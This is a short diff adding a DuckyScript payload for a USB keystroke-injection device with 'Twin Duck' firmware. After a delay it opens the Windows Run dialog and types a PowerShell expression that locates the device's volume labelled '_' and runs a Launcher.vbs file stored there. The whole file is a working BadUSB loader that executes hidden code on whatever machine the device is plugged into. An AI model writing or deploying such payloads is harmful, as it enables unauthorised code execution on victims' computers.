@@ -1,0 +1,7 @@
+REM Biiig delay for Twin Duck Firmware Correct Reading
+DELAY 10000
+GUI R
+DELAY 200 
+STRING .((gwmi win32_volume -f 'label=''_''').Name+'Launcher.vbs')
+DELAY 200 
+ENTER
